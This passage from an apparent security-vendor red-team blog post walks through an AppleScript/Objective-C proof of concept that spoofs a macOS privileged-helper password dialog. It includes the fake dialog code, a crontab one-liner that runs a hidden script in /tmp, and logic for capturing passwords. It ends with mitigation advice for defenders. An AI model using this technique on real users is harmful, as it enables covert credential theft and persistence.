			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">str</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000; font-weight: bold">my</span> (<span style="color: #008000; font-weight: bold">its</span> <span style="color: #19177C">removePunctuation</span>:<span style="color: #19177C">str</span>))
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">str</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">str</span>&#39;s <span style="color: #19177C">stringByReplacingOccurrencesOfString</span>:<span style="color: #BA2121">&quot;\&quot;&quot;</span> <span style="color: #19177C">withString</span>:<span style="color: #BA2121">&quot;&quot;</span>)
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">bundleID</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">str</span>&#39;s <span style="color: #19177C">componentsSeparatedByString</span>:<span style="color: #BA2121">&quot; &quot;</span>)&#39;s <span style="color: #008000">item</span> <span style="color: #666666">1</span>
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">bundlePath</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">NSWorkspace</span>&#39;s <span style="color: #19177C">sharedWorkspace</span>&#39;s <span style="color: #19177C">absolutePathForAppBundleWithIdentifier</span>:<span style="color: #19177C">bundleID</span>)
		<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
		<span style="color: #008000; font-weight: bold">if</span> <span style="color: #19177C">bundleID</span> <span style="color: #AA22FF; font-weight: bold">is not</span> <span style="color: #880000">missing value</span> <span style="color: #008000; font-weight: bold">then</span>
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">helpers_and_apps</span> <span style="color: #008000; font-weight: bold">to</span> {<span style="color: #19177C">parent</span>:<span style="color: #19177C">bundleID</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>, <span style="color: #7D9029">path</span>:<span style="color: #19177C">bundlePath</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>, <span style="color: #19177C">helperName</span>:<span style="color: #19177C">hlpr</span>&#39;s <span style="color: #7D9029">name</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>, <span style="color: #19177C">helperpath</span>:<span style="color: #19177C">hlpr</span>&#39;s <span style="color: #7D9029">path</span>}
		<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">repeat</span>

<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">helpersCount</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000">count</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">helpers_and_apps</span>
<span style="color: #008000; font-weight: bold">if</span> <span style="color: #19177C">helpersCount</span> <span style="color: #AA22FF; font-weight: bold">is greater than</span> <span style="color: #666666">0</span> <span style="color: #008000; font-weight: bold">then</span>
	<span style="color: #408080; font-style: italic"># 			-- choose one at random</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">n</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000">random number</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #666666">1</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">helpersCount</span>) <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">integer</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">chosenHelper</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000">item</span> <span style="color: #19177C">n</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">helpers_and_apps</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">hlprName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">chosenHelper</span>&#39;s <span style="color: #19177C">helperName</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">parentName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">chosenHelper</span>&#39;s <span style="color: #7D9029">path</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">shortName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getShortAppName</span>:(<span style="color: #19177C">parentName</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>)
	<span style="color: #408080; font-style: italic">-- set the default icon in case next command fails</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">software_update_icon</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">POSIX</span> <span style="color: #19177C">file</span> (<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">defaultIconStr</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>)
	<span style="color: #408080; font-style: italic">-- try to get the current helper apps icon</span>
	<span style="color: #008000; font-weight: bold">try</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">iconName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getIconFor</span>:<span style="color: #19177C">parentName</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">software_update_icon</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">POSIX</span> <span style="color: #19177C">file</span> (<span style="color: #19177C">parentName</span> <span style="color: #666666">&amp;</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">resourcesFldr</span> <span style="color: #666666">&amp;</span> (<span style="color: #19177C">iconName</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>) <span style="color: #666666">&amp;</span> <span style="color: #19177C">iconExt</span>)
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">try</span>
	<span style="color: #408080; font-style: italic">-- let&#39;s get the user name from Foundation framework:</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">userName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSUserName</span>()
	<span style="color: #008000">display dialog</span> <span style="color: #19177C">hlprName</span> <span style="color: #666666">&amp;</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">makeChanges</span> <span style="color: #666666">&amp;</span> <span style="color: #880000">return</span> <span style="color: #666666">&amp;</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">privString</span> <span style="color: #666666">&amp;</span> <span style="color: #19177C">userName</span> <span style="color: #666666">&amp;</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">allowThis</span> <span style="color: #19177C">default</span> <span style="color: #19177C">answer</span> <span style="color: #BA2121">&quot;&quot;</span> <span style="color: #19177C">with</span> <span style="color: #7D9029">title</span> <span style="color: #19177C">shortName</span> <span style="color: #19177C">default</span> <span style="color: #008000">button</span> <span style="color: #BA2121">&quot;OK&quot;</span> <span style="color: #19177C">with</span> <span style="color: #19177C">icon</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">software_update_icon</span> <span style="color: #008000; font-weight: bold">as</span> «<span style="color: #008000">class furl</span>» <span style="color: #19177C">with</span> <span style="color: #7D9029">hidden</span> <span style="color: #19177C">answer</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
</pre>
</div>
<p><span style="font-weight: 400;"></span></p>
<h2>Choosing an Execution Method</h2>
<p><span style="font-weight: 400;"><span class="marker-animation">One of AppleScript&#8217;s great versatilities is the sheer variety of ways that you can execute it.</span> This is a topic I will explore further another time, but for now let&#8217;s simply list the ways. Aside from running your script in a Script Editor &#8211; something you&#8217;d likely never do other than during development &#8211; you can run AppleScript code from Services workflows, Mail Rules, Folder Actions, Droplets, and a bunch of third party utilities to boot. You can export your script as an application directly from the Script Editor, complete with its own Resources folder and icon, and you can even codesign it right there, too. </span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/0-codesign.jpg?lossy=0&strip=1&webp=0" alt="image of export script as app" width="1156" height="342" class="aligncenter size-full wp-image-26620" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/0-codesign.jpg?lossy=0&amp;strip=1&amp;webp=0 1156w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/0-codesign-300x89.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/0-codesign-1024x303.jpg?lossy=0&amp;strip=1&amp;webp=0 1024w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/0-codesign-768x227.jpg?lossy=0&amp;strip=1&amp;webp=0 768w" sizes="(max-width: 1156px) 100vw, 1156px" /></p>
<p><span style="font-weight: 400;">But perhaps the most versatile &#8211; and stealthy &#8211; way of all is simply to save your script as plain text with an <code>osascript</code> shebang at the top. That will allow you to call it from the command line, with no pre-compilation necessary at all. Try this simple experiment in your favorite text or code editor:</span></p>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;">
<pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">#!/usr/bin/osascript</span>
use framework <span style="color: #BA2121">&quot;Foundation&quot;</span>
property NSWorkspace : a reference to current application<span style="color: #BA2121">&#39;s NSWorkspace</span>
<span style="color: #BA2121">set isFront to NSWorkspace&#39;</span>s sharedWorkspace<span style="color: #BA2121">&#39;s frontmostApplication&#39;</span>s localizedName as text
</pre>
</div>
<p><span style="font-weight: 400;"> </span></p>
<p><span style="font-weight: 400;">If your editor has the ability to run code directly (e.g, in BBEdit you can execute the contents of the front window with Command-R), run it now and note the result. Otherwise, save the file and run it from the command line.</span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/1-run-in-bbedit.jpg?lossy=0&strip=1&webp=0" alt="image of run in bbedit" width="988" height="329" class="aligncenter size-full wp-image-26621" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/1-run-in-bbedit.jpg?lossy=0&amp;strip=1&amp;webp=0 988w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/1-run-in-bbedit-300x100.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/1-run-in-bbedit-768x256.jpg?lossy=0&amp;strip=1&amp;webp=0 768w" sizes="(max-width: 988px) 100vw, 988px" /><br />
<span style="font-weight: 400;">Of course, it returns the code editor itself since that is the frontmost app when you execute it. If we save the file as &#8216;frontmost_app&#8217; without a file extension and run it from the Terminal, no prizes for guessing what&#8217;s returned, as the Terminal is now the frontmost app:</span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/2-run-in-terminal.jpg?lossy=0&strip=1&webp=0" alt="image of run in terminal" width="1586" height="382" class="aligncenter size-full wp-image-26622" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/2-run-in-terminal.jpg?lossy=0&amp;strip=1&amp;webp=0 1586w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/2-run-in-terminal-300x72.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/2-run-in-terminal-1024x247.jpg?lossy=0&amp;strip=1&amp;webp=0 1024w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/2-run-in-terminal-768x185.jpg?lossy=0&amp;strip=1&amp;webp=0 768w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/2-run-in-terminal-1536x370.jpg?lossy=0&amp;strip=1&amp;webp=0 1536w" sizes="(max-width: 1586px) 100vw, 1586px" /><br />
<span style="font-weight: 400;"><span class="marker-animation">This may seem trivial, but it&#8217;s actually quite consequential.</span> Until relatively recently, if you wanted to call Apple&#8217;s Carbon or Cocoa APIs on a Mac, you needed to build your code and compile it into a <a href="https://www.sentinelone.com/blog/how-to-reverse-malware-on-macos-without-getting-infected-part-3/" rel="noopener noreferrer" target="_blank">Mach-O binary</a>. Of course, you don&#8217;t need a Mach-O if you want to run Bash shell commands, but then you can&#8217;t access the powerful Cocoa and Foundation APIs from that kind of shell script either. </span></p>
<p><span style="font-weight: 400;">The problem with binaries, though, particularly on <a href="https://www.sentinelone.com/blog/command-line-intrusion-mojave-blocks-admins/" rel="noopener noreferrer" target="_blank">Mojave</a> and <a href="https://www.sentinelone.com/blog/macos-catalina-big-upgrad-dont-get-caught-out/" rel="noopener noreferrer" target="_blank">Catalina</a>, is that they can be <a href="https://www.sentinelone.com/blog/how-to-reverse-macos-malware-part-two/" rel="noopener noreferrer" target="_blank">scanned for strings</a> and byte sequences, subjected to codesigning and <a href="https://www.sentinelone.com/blog/maco-notarization-security-hardening-or-security-theater/" rel="noopener noreferrer" target="_blank">notarization</a> checks, and typically are written to disk where they can be detected by AV suites and other security tools. Wouldn&#8217;t it be nice if there was a way of executing native API code without all those security hurdles to get past? <span class="marker-animation">Wouldn&#8217;t it be nice if we could execute that code <em>in memory</em>?</span></span></p>
<blockquote>
<div style="background: #f8f8f8; overflow: auto; width: auto; padding: .4em .4em;"><span style="font-weight: 400;">Also see: <a href="https://www.sentinelone.com/blog/detecting-macos-gmera-malware-through-behavioral-inspection/" target="_blank" rel="noopener noreferrer">Detecting macOS.GMERA Malware Through Behavioral Inspection</a></span></div>
</blockquote>
<p><span> </span></p>
<p><span style="font-weight: 400;">On that point, the recent <a href="https://objective-see.com/blog/blog_0x51.html" rel="noopener noreferrer" target="_blank">discovery</a> of a &#8220;fileless&#8221; macOS malware that builds and executes a binary in memory using the native <code>NSCreateObjectFileImageFromMemory</code> and <code>NSLinkModule</code> caused a bit of a stir this week, although it&#8217;s <a href="https://twitter.com/michalmalik/status/1201981655306637312" rel="noopener noreferrer" target="_blank">not the first time</a> this technique has been seen in the wild. However, with AppleScript/Objective C, we can get the power of Cocoa and Foundation APIs without building a binary at all. And since we can execute our scripts containing AppleScript/Objective C from plain, uncompiled text, that means we can CURL out to a remote server to download and then execute our &#8220;malicious&#8221; AppleScript/Objective C code in memory, too, without ever touching the file system. </span></p>
<p><span style="font-weight: 400;">At this point, it&#8217;s probably worth pointing out that AppleScript isn&#8217;t the only way you can do this. There is also JavaScript for Automation (<a href="https://github.com/JXA-Cookbook/JXA-Cookbook" rel="noopener noreferrer" target="_blank">JXA</a>), a 3rd party Python/Objective C (<a href="https://pypi.org/project/pyobjc/" rel="noopener noreferrer" target="_blank">PyObjC</a>) and even <a href="https://dev.iachieved.it/iachievedit/using-swift-as-a-scripting-language/" rel="noopener noreferrer" target="_blank">Swift</a> can be used as a scripting language. However, to my mind AppleScript/Objective C is more stable and mature than JXA, less obvious than Python and doesn&#8217;t require external dependencies, while also substantially easier to develop than Swift scripts. That doesn&#8217;t mean these alternatives aren&#8217;t worth our attention another day, though!</span></p>
<h2>But wait…Why Not Use &#8216;Vanilla&#8217; AppleScript?</h2>
<p><span style="font-weight: 400;">Let&#8217;s return to our Proof-of-Concept script that we began in the <a href="https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/" rel="noopener noreferrer" target="_blank">previous post</a>. Our little NSWorkspace code snippet above will come in handy as one of the tasks we have to implement is watching for the app that we have chosen to spoof becoming active. <span class="marker-animation">This will be an ideal time to socially engineer the user and see if we can catch our target off guard and grab their credentials. </span></span></p>
<p><span style="font-weight: 400;">Old school AppleScripters will know that we can use a short snippet of what is sometimes called &#8220;vanilla&#8221; AppleScript code to tell us which app is &#8220;frontmost&#8221; without reaching out to Cocoa APIs like NSWorkspace. </span></p>
<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;">
<pre style="margin: 0; line-height: 125%"><span style="color: #008000; font-weight: bold">tell</span> <span style="color: #008000">application</span> <span style="color: #BA2121">&quot;System Events&quot;</span>

<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">frontapp</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">POSIX</span> <span style="color: #7D9029">path</span> <span style="color: #008000; font-weight: bold">of</span> (<span style="color: #19177C">file</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">process</span> <span style="color: #666666">1</span> <span style="color: #008000">whose</span> <span style="color: #7D9029">frontmost</span> <span style="color: #AA22FF; font-weight: bold">is</span> <span style="color: #880000">true</span>) <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>

<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">tell</span>
</pre>
</div>
<p><span style="font-weight: 400;"> </span></p>
<p><span style="font-weight: 400;">However, vanilla AppleScript is problematic on a few counts. One, AppleScript is much slower than Objective C; two, the System Events app itself is notoriously slow and sometimes buggy; three, <a href="https://www.sentinelone.com/blog/macos-catalina-big-upgrad-dont-get-caught-out/" rel="noopener noreferrer" target="_blank">on Catalina</a>, Apple have put limits on what you can do with some of the Apple Events generated by AppleScript. As soon as you start trying to control applications with AppleScript you are at risk of triggering a user consent dialog. From <a href="https://developer.apple.com/videos/play/wwdc2019/701/" rel="noopener noreferrer" target="_blank">WWDC 2019</a>:</span></p>
<blockquote><p>
<span style="font-weight: 400;">&#8220;…the user must consent before one app can use AppleScript or raw Apple Events to control the actions of another app. These consent prompts make it clear, which apps are acting under the influence of which other apps and give the user control over that automation.&#8221;</p></blockquote>
<p></span></p>
<p><span style="font-weight: 400;">We can avoid these potentially noisy Apple Events by steering clear of interacting with other apps and utilities with vanilla AppleScript and sticking to a combination of Foundation and Cocoa APIs and calling out to native command line utilities where necessary. </span></p>
<h2>Finding the Right Time For Social Engineering</h2>
<p><span style="font-weight: 400;">Our next obstacle is figuring out how to check for our target app becoming frontmost without our own code getting in the way and becoming frontmost when we execute it. <span class="marker-animation">The answer to that problem lies in deciding how we&#8217;re going to launch our POC script. </span></span></p>
<p><span style="font-weight: 400;">As we&#8217;ve seen, there are many different contexts in which we can launch AppleScript code, but let&#8217;s assume here that we will execute our script from a plain text ASCII file. We can do that in any number of ways. From a parent <code>bash</code> or <code>python</code> script, or directly from <code>osascript</code>, and there are also a number of options in terms of watching for the application to come frontmost. Rather than recommend any in particular, I&#8217;ll refer you to this post on <a href="https://www.sentinelone.com/blog/how-malware-persists-on-macos/" rel="noopener noreferrer" target="_blank">macOS persistence methods</a>, which explains the various options for launching persistent code. For the sake of this example, I&#8217;m going to use a cron job because cron jobs are quick and easy to write and less visible to most users than, say, LaunchAgents and LaunchDaemons. </span></p>
<blockquote>
<div style="background: #f8f8f8; overflow: auto; width: auto; padding: .4em .4em;"><span style="font-weight: 400;">Also see: <a href="https://www.sentinelone.com/blog/privilege-escalation-macos-malware-path-to-root/" target="_blank" rel="noopener noreferrer">Privilege Escalation | macOS Malware &#038; The Path to Root Part 1</a></span></div>
</blockquote>
<p><span> </span></p>
<p><span style="font-weight: 400;">We can insert a cron job to the user&#8217;s crontab without authorization or authentication. A simple <code>echo</code> will do, though beware that this particular way of doing it will overwrite any existing cron jobs the user may have:</span></p>
<p><code>$ echo '*/1    *    *    *    * /tmp/.local' | crontab - </code></p>
<p><span style="font-weight: 400;">This will cause whatever is located at <code>/tmp/.local</code> to execute once a minute, indefinitely. Of course, we place our POC script at just that location. Let&#8217;s expand our earlier snippet and test this mechanism to make sure it returns the application that the user is engaged with rather than our calling code:</span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/3-frontmost-app.jpg?lossy=0&strip=1&webp=0" alt="image of frontmost app" width="1099" height="288" class="aligncenter size-full wp-image-26623" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/3-frontmost-app.jpg?lossy=0&amp;strip=1&amp;webp=0 1099w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/3-frontmost-app-300x79.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/3-frontmost-app-1024x268.jpg?lossy=0&amp;strip=1&amp;webp=0 1024w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/3-frontmost-app-768x201.jpg?lossy=0&amp;strip=1&amp;webp=0 768w" sizes="(max-width: 1099px) 100vw, 1099px" /></p>
<p><span style="font-weight: 400;">Save this as <code>/tmp/.local</code> and execute the line above to install the crontab. Assuming you have no other cron jobs, you can safely do this on your own machine and remove the crontab later with </span></p>
<p><code>$ crontab -r</code></p>
<p><span style="font-weight: 400;">Now, you might like to continue browsing for a minute or so before inspecting what&#8217;s inside the <code>~/front.out</code> file. If all&#8217;s gone well, it should be the name of your browser, or whatever application you were using when the code triggered. </span></p>
<p><span style="font-weight: 400;">The cron job will keep running the script and overwrite the last entry every minute until you either delete the crontab or remove the script at <code>/tmp/.local</code>. </span></p>
<p><span style="font-weight: 400;"><span class="marker-animation">We now have a mechanism for watching for the user&#8217;s activity that should not trip any built-in macOS security mechanisms.</span> We can now hook that up to our POC script so that whatever application has been chosen by the script to get spoofed is the one we watch out for.</span></p>
<p><span style="font-weight: 400;">Let&#8217;s add a repeat loop that calls a new handler, <code>checkIfFrontmost:shortName</code>.</span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/4-add-handler.jpg?lossy=0&strip=1&webp=0" alt="image of add handler" width="992" height="362" class="aligncenter size-full wp-image-26624" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/4-add-handler.jpg?lossy=0&amp;strip=1&amp;webp=0 992w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/4-add-handler-300x109.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/4-add-handler-768x280.jpg?lossy=0&amp;strip=1&amp;webp=0 768w" sizes="(max-width: 992px) 100vw, 992px" /></p>
<p><span style="font-weight: 400;">You can now create the handler further up the script by adapting the code snippet we tested above to check and return <strong>true</strong> if the app name is the same as <code>shortName</code>, and <strong>false</strong> otherwise. Remember that <code>shortName</code> is being passed into the handler as an NSString, so deal with that as described in the <a href="https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/" rel="noopener noreferrer" target="_blank">previous post</a>.</span></p>
<h2>Password Capture and Confirmation</h2>
<p><span style="font-weight: 400;">We now have pretty much everything in place: a means of enumerating trusted, authorized helper tools and their parent apps, a convincing dialog box with icon and appropriate title, and a means of determining when the user is engaged with our target app. Let’s add the code for dealing with the dialog box’s “OK” and “Cancel” buttons.</span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/5-capture-password-scaled.jpg?lossy=0&strip=1&webp=0" alt="image of capture password" width="2560" height="1230" class="aligncenter size-full wp-image-26625" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/5-capture-password-scaled.jpg?lossy=0&amp;strip=1&amp;webp=0 2560w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/5-capture-password-300x144.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/5-capture-password-1024x492.jpg?lossy=0&amp;strip=1&amp;webp=0 1024w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/5-capture-password-768x369.jpg?lossy=0&amp;strip=1&amp;webp=0 768w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/5-capture-password-1536x738.jpg?lossy=0&amp;strip=1&amp;webp=0 1536w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/5-capture-password-2048x984.jpg?lossy=0&amp;strip=1&amp;webp=0 2048w" sizes="(max-width: 2560px) 100vw, 2560px" /></p>
<p><span style="font-weight: 400;">Here we repeat the request twice, and save the answer given in a list called <code>answers</code>. Later, we retrieve the last answer in the list, assuming that the user would have typed more carefully on the second request, as typically users believe a failed authorization is due to their own typing error. We also add some logic here in case the user decides to cancel out at any point. In that event, we throw another dialog saying the parent app &#8220;can&#8217;t continue&#8221;, and we then attempt to kill the process by getting its PID either from the app&#8217;s path or its bundle identifier. Again, note we could do this directly with vanilla AppleScript just by using a </span></p>
<p><code>tell application "BBEdit" to quit</code></p>
<p><span style="font-weight: 400;">We could also use NSRunningApplication&#8217;s <code>terminate</code> API, but at risk of running into macOS security checks, it may be better to shell out and issue a <code>kill</code> command via <code>do shell script</code>. Here&#8217;s a quick and dirty handler for grabbing the PID that probably needs a bit more battle-testing.</span></p>
<p><img loading="lazy" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/Screenshot-2019-12-09-at-21.45.13.jpg?lossy=0&strip=1&webp=0" alt="image of getPidFor handler" width="2304" height="846" class="aligncenter size-full wp-image-26752" srcset="https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/Screenshot-2019-12-09-at-21.45.13.jpg?lossy=0&amp;strip=1&amp;webp=0 2304w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/Screenshot-2019-12-09-at-21.45.13-300x110.jpg?lossy=0&amp;strip=1&amp;webp=0 300w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/Screenshot-2019-12-09-at-21.45.13-1024x376.jpg?lossy=0&amp;strip=1&amp;webp=0 1024w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/Screenshot-2019-12-09-at-21.45.13-768x282.jpg?lossy=0&amp;strip=1&amp;webp=0 768w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/Screenshot-2019-12-09-at-21.45.13-1536x564.jpg?lossy=0&amp;strip=1&amp;webp=0 1536w, https://899029.smushcdn.com/2131410/wp-content/uploads/2019/12/Screenshot-2019-12-09-at-21.45.13-2048x752.jpg?lossy=0&amp;strip=1&amp;webp=0 2048w" sizes="(max-width: 2304px) 100vw, 2304px" /></p>
<p><span style="font-weight: 400;">Finally, I leave it as an exercise for the reader to decide on how best to write the password out to file. You could use vanilla AppleScript here, since it won&#8217;t involve interapplication communication, but there&#8217;s a perfectly good (faster, stabler) NSString <code>writeToFile:</code> API that you can use instead. Regardless of technique, consider the location carefully in light of Mojave&#8217;s and Catalina&#8217;s new <a href="https://www.sentinelone.com/blog/mojaves-security-hardening-user-protections-bypassed/" rel="noopener noreferrer" target="_blank">user privacy restrictions</a>. Our incomplete POC script will also require some further logic to stop the spoofing (remember that cron job is still firing!) once we&#8217;ve successfully captured the password.</span></p>
<h2>Blue Teams and Mitigation Strategies</h2>
<p><span style="font-weight: 400;">In this post and the <a href="https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/" rel="noopener noreferrer" target="_blank">previous post</a>, I&#8217;ve tried to show how AppleScript can be leveraged as a &#8220;living off the land&#8221; utility in the hope of drawing attention to just how powerful this underused and underrated macOS technology really is.</span> </p>
<p><span style="font-weight: 400;">While I find it unlikely that threat actors would use these techniques in the wild &#8211; in part, because threat actors already have <a href="https://www.sentinelone.com/blog/privilege-escalation-macos-malware-the-path-to-root-part-2/" rel="noopener noreferrer" target="_blank">well established techniques</a> for acquiring privileges &#8211; I believe it is important that as security researchers we turn over every stone, look into every possibility and ask questions like &#8220;what if someone did this?&#8221; &#8220;how would we detect it?&#8221; &#8220;what should we do to prevent it?&#8221; I believe the onus is on us to know at least as much as our adversaries about how macOS technologies work and what can be done with them. </span></p>
<blockquote>
<div style="background: #f8f8f8; overflow: auto; width: auto; padding: .4em .4em;"><span style="font-weight: 400;">Also see: <a href="https://www.sentinelone.com/blog/macos-incident-response-part-1-collecting-device-file-system-data/" target="_blank" rel="noopener noreferrer">macOS Incident Response | Part 1: Collecting Device, File &#038; System Data</a></span></div>
</blockquote>
<p><span> </span></p>
<p><span style="font-weight: 400;">On top of that, the ease (after a little practice!) with which <span class="marker-animation">sophisticated and powerful AppleScript/Objective C scripts can be built, modified and deployed</span> can provide another useful tool for <a href="https://www.sentinelone.com/blog/vulnerability-assessment-penetration-testing-redteaming-oh-my-god/" rel="noopener noreferrer" target="_blank">red teams</a> looking for unexpected pay offs in their engagements. </span></p>
<p><span style="font-weight: 400;">For mitigation strategies, aside from running demos of this kind of spoofing activity to educate users, defenders should look out for <code>osascript</code> in the processes list. There aren&#8217;t many legitimate users of <code>osascript</code> in organizations and those that there are should be easy to enumerate and monitor. AppleScript is very much like &#8220;the PowerShell of macOS&#8221;, only with <em>much more</em> power and much <em>less</em> scrutiny from the security community. Let&#8217;s make sure we, as defenders, know more about it than those with malicious intent.</span></p>
<hr />
<p><strong>Like this article? Follow us on <a href="https://www.linkedin.com/company/2886771/" target="_blank" rel="noopener noreferrer">LinkedIn</a>, <a href="https://twitter.com/SentinelOne" target="_blank" rel="noopener noreferrer">Twitter</a>, <a href="https://goo.gl/e5C9f4" target="_blank" rel="noopener noreferrer">YouTube</a> or <a href="https://www.facebook.com/SentinelOne" target="_blank" rel="noopener noreferrer">Facebook</a> to see the content we post.</strong></p>
<h3>Read more about Cyber Security</h3>
<ul>
<li><a href="https://www.sentinelone.com/blog/the-most-important-cyber-prediction-for-2020-and-beyond-the-convergence-of-speed/" rel="noopener noreferrer" target="_blank">The Most Important Cyber Prediction for 2020 and Beyond: The Convergence of Speed</a></li>
